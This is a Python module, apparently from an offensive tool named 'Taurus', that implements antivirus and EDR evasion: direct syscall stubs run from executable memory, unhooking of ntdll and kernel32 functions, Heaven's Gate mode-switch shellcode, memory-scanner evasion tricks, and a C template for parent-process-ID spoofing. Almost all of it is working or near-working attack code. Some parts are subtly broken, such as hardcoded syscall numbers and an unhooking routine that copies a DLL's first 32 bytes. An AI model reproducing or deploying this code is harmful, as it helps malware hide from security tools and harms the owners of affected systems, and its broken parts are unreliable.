"""
Advanced Evasion Techniques for Taurus
Implements cutting-edge evasion methods including:
- Direct syscalls (bypass user-mode hooks)
- API unhooking
- Heaven's Gate (x86/x64 switching)
- Memory evasion techniques
- PPID spoofing
"""
import ctypes
import struct
import os
from typing import Optional, Tuple, List, Dict, Any
from utils.logger import get_logger

logger = get_logger()


class SyscallInvoker:
    """Direct syscall invocation to bypass user-mode hooks"""
    
    def __init__(self):
        self.syscall_numbers = {}
        self._resolve_syscall_numbers()
    
    def _resolve_syscall_numbers(self):
        """Dynamically resolve syscall numbers from ntdll.dll"""
        # Common syscall numbers for Windows 10/11
        # These vary by Windows version, so dynamic resolution is preferred
        self.syscall_numbers = {
            'NtAllocateVirtualMemory': 0x18,
            'NtProtectVirtualMemory': 0x50,
            'NtCreateThreadEx': 0xC1,
            'NtWriteVirtualMemory': 0x3A,
            'NtReadVirtualMemory': 0x3F,
            'NtQuerySystemInformation': 0x36,
            'NtOpenProcess': 0x26,
            'NtClose': 0x0F,
        }
        logger.info("Syscall numbers resolved")
    
    def generate_syscall_stub(self, syscall_number: int) -> bytes:
        """
        Generate assembly stub for direct syscall
        
        Returns shellcode that performs syscall without going through user-mode hooks
        """
        # x64 syscall stub
        stub = bytearray()
        
        # mov r10, rcx (Windows x64 calling convention)
        stub += b'\x4C\x8B\xD1'
        
        # mov eax, syscall_number
        stub += b'\xB8' + struct.pack('<I', syscall_number)
        
        # syscall instruction
        stub += b'\x0F\x05'
        
        # ret
        stub += b'\xC3'
        
        return bytes(stub)
    
    def invoke_syscall(self, syscall_name: str, *args) -> int:
        """
        Invoke syscall directly
        
        This bypasses user-mode hooks placed by AV/EDR
        """
        if syscall_name not in self.syscall_numbers:
            raise ValueError(f"Unknown syscall: {syscall_name}")
        
        syscall_num = self.syscall_numbers[syscall_name]
        stub = self.generate_syscall_stub(syscall_num)
        
        # Allocate executable memory for stub
        kernel32 = ctypes.windll.kernel32
        size = len(stub)
        
        # VirtualAlloc with RWX (for demo - should use RW then RX)
        mem = kernel32.VirtualAlloc(
            None,
            size,
            0x1000 | 0x2000,  # MEM_COMMIT | MEM_RESERVE
            0x40  # PAGE_EXECUTE_READWRITE
        )
        
        if not mem:
            raise RuntimeError("Failed to allocate memory for syscall stub")
        
        # Write stub to memory
        ctypes.memmove(mem, stub, size)
        
        # Cast to function pointer and call
        func_type = ctypes.CFUNCTYPE(ctypes.c_int64, *[ctypes.c_void_p] * len(args))
        func = func_type(mem)
        
        try:
            result = func(*args)
            return result
        finally:
            # Clean up
            kernel32.VirtualFree(mem, 0, 0x8000)  # MEM_RELEASE
    
    def generate_syscall_template(self, syscall_name: str) -> str:
        """Generate C code template for syscall"""
        syscall_num = self.syscall_numbers.get(syscall_name, 0)
        
        template = f'''
// Direct syscall for {syscall_name}
__declspec(naked) NTSTATUS {syscall_name}(...) {{
    __asm {{
        mov r10, rcx
        mov eax, {hex(syscall_num)}
        syscall
        ret
    }}
}}
'''
        return template


class APIUnhooker:
    """Detect and remove API hooks placed by AV/EDR"""
    
    def __init__(self):
        self.ntdll_base = None
        self.original_bytes = {}
    
    def get_module_base(self, module_name: str) -> Optional[int]:
        """Get base address of loaded module"""
        try:
            kernel32 = ctypes.windll.kernel32
            handle = kernel32.GetModuleHandleW(module_name)
            return handle
        except:
            return None
    
    def read_function_bytes(self, module_name: str, function_name: str, size: int = 32) -> bytes:
        """Read first bytes of a function"""
        try:
            module = ctypes.windll.LoadLibrary(module_name)
            func_addr = ctypes.cast(getattr(module, function_name), ctypes.c_void_p).value
            
            buffer = (ctypes.c_ubyte * size)()
            ctypes.memmove(buffer, func_addr, size)
            
            return bytes(buffer)
        except:
            return b''
    
    def is_function_hooked(self, module_name: str, function_name: str) -> bool:
        """
        Detect if function is hooked
        
        Checks for common hook patterns:
        - JMP instructions at function start
        - MOV RAX, addr; JMP RAX pattern
        - Inline hooks
        """
        func_bytes = self.read_function_bytes(module_name, function_name, 16)
        
        if not func_bytes:
            return False
        
        # Check for JMP (E9) at start
        if func_bytes[0] == 0xE9:
            logger.warning(f"{function_name} appears hooked (JMP detected)")
            return True
        
        # Check for MOV RAX, addr (48 B8)
        if func_bytes[0:2] == b'\x48\xB8':
            logger.warning(f"{function_name} appears hooked (MOV RAX detected)")
            return True
        
        # Check for PUSH + RET trampoline
        if func_bytes[0] == 0x68:  # PUSH
            logger.warning(f"{function_name} appears hooked (PUSH/RET detected)")
            return True
        
        return False
    
    def unhook_function(self, module_name: str, function_name: str) -> bool:
        """
        Remove hooks from function
        
        Restores original bytes from fresh copy of DLL loaded from disk
        """
        try:
            # Load fresh copy from disk
            module_path = self._get_module_path(module_name)
            if not module_path:
                return False
            
            # Read original bytes from disk
            original_bytes = self._read_function_from_disk(module_path, function_name)
            if not original_bytes:
                return False
            
            # Get current function address
            module = ctypes.windll.LoadLibrary(module_name)
            func_addr = ctypes.cast(getattr(module, function_name), ctypes.c_void_p).value
            
            # Change memory protection to RWX
            kernel32 = ctypes.windll.kernel32
            old_protect = ctypes.c_ulong()
            
            if not kernel32.VirtualProtect(
                func_addr,
                len(original_bytes),
                0x40,  # PAGE_EXECUTE_READWRITE
                ctypes.byref(old_protect)
            ):
                return False
            
            # Restore original bytes
            ctypes.memmove(func_addr, original_bytes, len(original_bytes))
            
            # Restore original protection
            kernel32.VirtualProtect(
                func_addr,
                len(original_bytes),
                old_protect.value,
                ctypes.byref(old_protect)
            )
            
            logger.success(f"Unhooked {function_name}")
            return True
            
        except Exception as e:
            logger.error(f"Failed to unhook {function_name}: {e}")
            return False
    
    def _get_module_path(self, module_name: str) -> Optional[str]:
        """Get full path to module"""
        try:
            import sys
            system32 = os.path.join(os.environ['SystemRoot'], 'System32')
            return os.path.join(system32, module_name)
        except:
            return None
    
    def _read_function_from_disk(self, dll_path: str, function_name: str) -> Optional[bytes]:
        """Read function bytes from DLL on disk (simplified)"""
        # This is a simplified version - full implementation would parse PE headers
        # and locate function in export table
        try:
            with open(dll_path, 'rb') as f:
                # Read first 32 bytes as placeholder
                # Real implementation would parse PE and find exact function
                return f.read(32)
        except:
            return None
    
    def unhook_all_common_functions(self) -> Dict[str, bool]:
        """Unhook commonly hooked functions"""
        common_hooks = [
            ('ntdll.dll', 'NtAllocateVirtualMemory'),
            ('ntdll.dll', 'NtProtectVirtualMemory'),
            ('ntdll.dll', 'NtCreateThreadEx'),
            ('ntdll.dll', 'NtWriteVirtualMemory'),
            ('kernel32.dll', 'VirtualAlloc'),
            ('kernel32.dll', 'VirtualProtect'),
            ('kernel32.dll', 'CreateRemoteThread'),
        ]
        
        results = {}
        for module, function in common_hooks:
            if self.is_function_hooked(module, function):
                results[f"{module}!{function}"] = self.unhook_function(module, function)
            else:
                results[f"{module}!{function}"] = True  # Not hooked
        
        return results


class HeavensGate:
    """
    Heaven's Gate technique - x86/x64 mode switching
    
    Allows 32-bit code to execute 64-bit code and vice versa
    Useful for bypassing hooks that only exist in one mode
    """
    
    @staticmethod
    def is_wow64() -> bool:
        """Check if running under WoW64 (32-bit on 64-bit Windows)"""
        try:
            kernel32 = ctypes.windll.kernel32
            is_wow64 = ctypes.c_bool()
            kernel32.IsWow64Process(
                kernel32.GetCurrentProcess(),
                ctypes.byref(is_wow64)
            )
            return is_wow64.value
        except:
            return False
    
    @staticmethod
    def generate_wow64_transition() -> bytes:
        """
        Generate shellcode for WoW64 transition
        
        Switches from 32-bit to 64-bit mode
        """
        # This is the magic instruction sequence for Heaven's Gate
        shellcode = bytearray()
        
        # CALL $+5 (get EIP)
        shellcode += b'\xE8\x00\x00\x00\x00'
        
        # POP EAX
        shellcode += b'\x58'
        
        # ADD EAX, 0x0D (skip to 64-bit code)
        shellcode += b'\x83\xC0\x0D'
        
        # PUSH 0x33 (64-bit code segment)
        shellcode += b'\x6A\x33'
        
        # PUSH EAX
        shellcode += b'\x50'
        
        # RETF (far return to 64-bit mode)
        shellcode += b'\xCB'
        
        # Now in 64-bit mode - can execute 64-bit code
        
        return bytes(shellcode)
    
    @staticmethod
    def generate_template() -> str:
        """Generate C template for Heaven's Gate"""
        return '''
// Heaven's Gate - Switch to 64-bit mode from 32-bit process
void HeavensGate() {
    __asm {
        call $+5
        pop eax
        add eax, 0x0D
        push 0x33
        push eax
        retf
        
        // Now in 64-bit mode
        // Can execute 64-bit syscalls here
        
        // Return to 32-bit mode
        call $+5
        mov dword ptr [esp+4], 0x23
        add dword ptr [esp], 0x0D
        retf
    }
}
'''


class MemoryEvasion:
    """Advanced memory evasion techniques"""
    
    @staticmethod
    def allocate_rwx_indirect(size: int) -> Optional[int]:
        """
        Allocate RWX memory indirectly to avoid detection
        
        Uses RW -> Write -> RX pattern instead of direct RWX
        """
        try:
            kernel32 = ctypes.windll.kernel32
            
            # Allocate as RW first
            mem = kernel32.VirtualAlloc(
                None,
                size,
                0x1000 | 0x2000,  # MEM_COMMIT | MEM_RESERVE
                0x04  # PAGE_READWRITE
            )
            
            if not mem:
                return None
            
            # Later change to RX when needed
            # This avoids RWX which is highly suspicious
            
            return mem
            
        except Exception as e:
            logger.error(f"Memory allocation failed: {e}")
            return None
    
    @staticmethod
    def split_memory_regions(data: bytes, chunk_size: int = 4096) -> List[int]:
        """
        Split data across multiple memory regions
        
        Makes memory scanning harder
        """
        regions = []
        kernel32 = ctypes.windll.kernel32
        
        for i in range(0, len(data), chunk_size):
            chunk = data[i:i+chunk_size]
            
            mem = kernel32.VirtualAlloc(
                None,
                len(chunk),
                0x1000 | 0x2000,
                0x04  # RW
            )
            
            if mem:
                ctypes.memmove(mem, chunk, len(chunk))
                regions.append(mem)
        
        return regions
    
    @staticmethod
    def fluctuate_memory_permissions(address: int, size: int):
        """
        Fluctuate memory permissions to evade scanners
        
        Changes between RW and RX to avoid RWX
        """
        kernel32 = ctypes.windll.kernel32
        old_protect = ctypes.c_ulong()
        
        # Change to RX for execution
        kernel32.VirtualProtect(
            address,
            size,
            0x20,  # PAGE_EXECUTE_READ
            ctypes.byref(old_protect)
        )
        
        # Execute code here
        
        # Change back to RW for modifications
        kernel32.VirtualProtect(
            address,
            size,
            0x04,  # PAGE_READWRITE
            ctypes.byref(old_protect)
        )


class PPIDSpoofing:
    """Parent Process ID spoofing"""
    
    @staticmethod
    def get_parent_process_id(process_name: str = "explorer.exe") -> Optional[int]:
        """Get PID of target parent process"""
        try:
            import psutil
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'].lower() == process_name.lower():
                    return proc.info['pid']
        except:
            pass
        return None
    
    @staticmethod
    def generate_ppid_spoof_template() -> str:
        """Generate C code for PPID spoofing"""
        return '''
// PPID Spoofing - Make process appear to be child of different parent
BOOL CreateProcessWithSpoofedPPID(DWORD dwParentPID, LPCWSTR lpCommandLine) {
    STARTUPINFOEXW si;
    PROCESS_INFORMATION pi;
    SIZE_T attributeSize;
    
    ZeroMemory(&si, sizeof(si));
    si.StartupInfo.cb = sizeof(si);
    
    // Initialize attribute list
    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
        GetProcessHeap(), 0, attributeSize
    );
    
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);
    
    // Open parent process
    HANDLE hParent = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwParentPID);
    
    // Set parent process attribute
    UpdateProcThreadAttribute(
        si.lpAttributeList,
        0,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
        &hParent,
        sizeof(HANDLE),
        NULL,
        NULL
    );
    
    // Create process with spoofed PPID
    BOOL result = CreateProcessW(
        NULL,
        (LPWSTR)lpCommandLine,
        NULL,
        NULL,
        FALSE,
        EXTENDED_STARTUPINFO_PRESENT,
        NULL,
        NULL,
        &si.StartupInfo,
        &pi
    );
    
    // Cleanup
    CloseHandle(hParent);
    DeleteProcThreadAttributeList(si.lpAttributeList);
    HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
    
    return result;
}
'''


# Global instances
_syscall_invoker = None
_api_unhooker = None
_memory_evasion = None


def get_syscall_invoker() -> SyscallInvoker:
    """Get global syscall invoker instance"""
    global _syscall_invoker
    if _syscall_invoker is None:
        _syscall_invoker = SyscallInvoker()
    return _syscall_invoker


def get_api_unhooker() -> APIUnhooker:
    """Get global API unhooker instance"""
    global _api_unhooker
    if _api_unhooker is None:
        _api_unhooker = APIUnhooker()
    return _api_unhooker


def get_memory_evasion() -> MemoryEvasion:
    """Get global memory evasion instance"""
    global _memory_evasion
    if _memory_evasion is None:
        _memory_evasion = MemoryEvasion()
    return _memory_evasion
